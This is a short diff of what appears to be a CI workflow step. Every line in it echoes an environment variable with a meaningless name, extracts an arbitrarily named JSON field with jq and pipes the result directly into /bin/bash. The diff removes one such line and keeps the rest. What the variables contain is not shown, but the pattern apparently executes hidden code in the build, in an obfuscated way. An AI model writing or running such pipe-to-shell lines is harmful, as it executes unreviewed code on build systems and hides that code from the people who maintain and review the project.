@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$a0" | jq -r .v40 | /bin/bash
           echo $ppto416 | jq -r .ehgao8879 | /bin/bash
-          echo $exlrn68 | jq -r .x2 | /bin/bash
           echo $rl01 | jq -r .avqrz57192 | /bin/bash
           echo $fllo5981 | jq -r .b581 | /bin/bash
           echo $j6 | jq -r .xl786 | /bin/bash
